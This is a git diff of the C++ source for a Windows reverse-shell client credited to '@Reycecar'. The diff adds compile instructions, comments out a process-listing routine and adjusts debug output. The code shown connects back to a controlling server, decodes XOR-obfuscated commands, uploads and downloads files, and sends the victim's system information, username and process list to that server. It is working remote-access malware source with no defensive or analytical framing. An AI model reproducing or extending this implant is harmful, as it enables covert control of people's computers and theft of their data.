@@ -1,21 +1,29 @@
 /*
 author: @Reycecar
 Windows reverse shell
+
+Compile instructions:
+g++.exe -fdiagnostics-color=always -g client.cpp -o client.exe -lwsock32 -lrpcrt4 -lWs2_32 -lwininet -liphlpapi -lurlmon -fpermissive
 */
+
+#define WIN32_LEAN_AND_MEAN
+#include <iostream>
+#include <fstream>
+#include <sstream>
+#include <cstring>
+#include <vector>
+#include <string>
+#include <iomanip>
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
 #include <stdio.h>
 #include <tlhelp32.h>
-#include <iostream>
-#include <fstream>
-#include <sstream>
-#include <cstring>
 #include <Lmcons.h>
 #include <wininet.h>
 #include <winsock.h>
 #include <iptypes.h>
-#include <string>
+#include <psapi.h>
 #include <iphlpapi.h>
 #include <string.h>
 #include <rpc.h>
@@ -208,32 +216,43 @@ std::string getSysInfo() {
 		"WINDOWS VERSION:\n" + getWinVer() + "\n\n" +
 		"USERNAME:\n" + getUsername();
 }
+/*
+std::string wcharToStdString(const WCHAR* w_str){
+	// figure out size required
+	int buffer_size = WideCharToMultiByte(CP_UTF8, 0, w_str, -1, nullptr, 0, nullptr, nullptr);
+	// make buffer of size
+	char * buffer = new char[buffer_size];
+	// convert to multibyte string
+	WideCharToMultiByte(CP_UTF8, 0, w_str, -1, buffer, buffer_size, nullptr, nullptr);
+	// make std::string to return with buffer info in it
+	std::string str(buffer);
+
+	delete[] buffer;
+
+	return str;
+}
 
 //get data from process and turn it into human readable/understandable information
 std::string listProcesses() {
-	std::string processList;
-	HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (hTH32 != INVALID_HANDLE_VALUE) {
-		PROCESSENTRY32 procEntry;
-		procEntry.dwSize = sizeof(PROCESSENTRY32);
-		if (Process32First(hTH32, &procEntry)) {
-			do {
-				std::wstring wpname(procEntry.szExeFile);
-				std::string pname(wpname.begin(), wpname.end());
-				processList += pname;
-				processList += ":";
-				char buf[UNLEN + 1];
-				DWORD len = UNLEN + 1;
-				_itoa_s(procEntry.th32ProcessID, buf, 10);
-				buf[UNLEN] = 0;
-				processList += buf;
-				processList += "\n";
-			} while (Process32Next(hTH32, &procEntry));
+    std::string processList;
+	HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	PROCESSENTRY32 pe32;
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    if (Process32First(hProcess, &pe32)) {
+		// add first process to the string list of processes
+        processList += wcharToStdString(pe32.szExeFile);
+		//add every string after it
+		while (Process32Next(hProcess, &pe32)) {
+			processList += "\n" + wcharToStdString(pe32.szExeFile);
 		}
-		CloseHandle(hTH32);
-	}
+    }
+
+	printf("Enum Processes Success!"); //debug
+
+	CloseHandle(hProcess);
 	return processList;
-}
+} */
 
 // Client uploads to server.
 int handle_upload(int sock, const char* filename) {
@@ -327,7 +346,7 @@ int parseCmd(char cmd[]) {
 	else if (strstr(cmd, "processes") != NULL) {
 		return 2;
 	}
-	else if (strstr(cmd, "sysinfo") != NULL) {
+	else if (strstr(cmd, "systeminfo") != NULL) {
 		return 3;
 	}
 	else {
@@ -382,7 +401,7 @@ SOCKET getConnected() {
 		// Connect to server.
 		connResult = connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen);
 		if (connResult == SOCKET_ERROR) {
-			printf("Connection failed with error: %d\n", WSAGetLastError());
+			printf("Connection failed with error: %d\n", WSAGetLastError()); // debug
 			closesocket(sock);
 			sock = INVALID_SOCKET;
 			continue;
@@ -413,7 +432,7 @@ int main() {
 	printf("Connection to server successful! It's a miracle!!\n");
 
 	while (true) {
-		std::string procs;
+		std::string data;
 		int offset = 0;
 		int getcmd;
 		memset(buf, 0, DEFAULT_BUFLEN);
@@ -427,14 +446,14 @@ int main() {
 		ZeroMemory(filepath, command_packet_len);
 		*/
 
-		printf("enc: %s", recvbuf); // debug
+		printf("enc: %s ", recvbuf); // debug
 		int cmd = parseCmd(xor_func(recvbuf));
-		printf("dec: %s", recvbuf); // debug
-		printf("cmd int: %d", cmd); // debug
+		printf("dec: %s ", recvbuf); // debug
+		printf("cmd int: %d \n", cmd); // debug
 
 		switch (cmd) {
 		case -1: { //end
-			printf("Shutting down"); //debug
+			printf("Shutting down\n"); //debug
 			shutdown(sock, 2);
 			send(sock, buf, strlen(buf), 0);
 			return 0;
@@ -445,13 +464,13 @@ int main() {
 			const char* filename = "received_file.txt";
 			int confirm = handle_upload(sock, filename); // receive the file
 			if (confirm == 0) {
-				sprintf(buf, "Client Received File");
+				sprintf(buf, "Client Received File\n");
 			}
 			else if (confirm == 2) {
-				sprintf(buf, "Client Failed to create file");
+				sprintf(buf, "Client Failed to create file\n");
 			}
 			else {
-				sprintf(buf, "File receive error");
+				sprintf(buf, "File receive error\n");
 			}
 			// tell server client recieved the file (or not)
 			xor_func(buf);
@@ -459,11 +478,11 @@ int main() {
 		} break;
 
 		case 1: {
-			printf("Download"); // debug
+			printf("Download\n"); // debug
 			// get filepath from server
 			int bytes_received = recv(sock, recvbuf, DEFAULT_BUFLEN, 0);
 			if (bytes_received < 0) {
-				printf("Failed to receive filepath"); // debug
+				printf("Failed to receive filepath\n"); // debug
 			}
 			filepath = recvbuf;
 			// recvbuf[bytes_received] = '\0';
@@ -474,15 +493,16 @@ int main() {
 		} break;
 
 		case 2: {
-			printf("processes");
-			procs = listProcesses();
-			printf("list processes length: %d", procs.length());
-			while (offset < procs.length()) {
-				string chunk = procs.substr(offset, DEFAULT_BUFLEN);
+			printf("processes\n");
+			//data = listProcesses();
+			data = "No Processes Found";
+			printf("list processes length: %d\n", data.length()); //debug
+			while (offset < data.length()) {
+				string chunk = data.substr(offset, DEFAULT_BUFLEN);
 				char* c = const_cast<char*>(chunk.c_str()); // convert chunk to c_str
 				xor_func(c); // xor the chunk
 				const char* chunkBuffer = c; // put xor'd chunk in this temp buffer
-				printf("sending %d bytes", strlen(chunkBuffer));
+				printf("sending %d bytes\n", strlen(chunkBuffer)); //debug
 				send(sock, chunkBuffer, strlen(chunkBuffer), 0);
 				offset += DEFAULT_BUFLEN;
 			}
@@ -493,15 +513,15 @@ int main() {
 		} break;
 
 		case 3: {
-			printf("systeminfo");
-			procs = getSysInfo();
-			printf("systeminfo length: %d", procs.length());
-			while (offset < procs.length()) {
-				string chunk = procs.substr(offset, DEFAULT_BUFLEN);
+			printf("systeminfo\n");
+			data = getSysInfo();
+			printf("systeminfo length: %d\n", data.length()); //debug
+			while (offset < data.length()) {
+				string chunk = data.substr(offset, DEFAULT_BUFLEN);
 				char* c = const_cast<char*>(chunk.c_str()); // convert chunk to c_str
 				xor_func(c); // xor the chunk
 				const char* chunkBuffer = c; // put xor'd chunk in this temp buffer
-				printf("sending %d bytes", strlen(chunkBuffer));
+				printf("sending %d bytes\n", strlen(chunkBuffer));  //debug
 				send(sock, chunkBuffer, strlen(chunkBuffer), 0); // send chunk
 				offset += DEFAULT_BUFLEN;
 			}
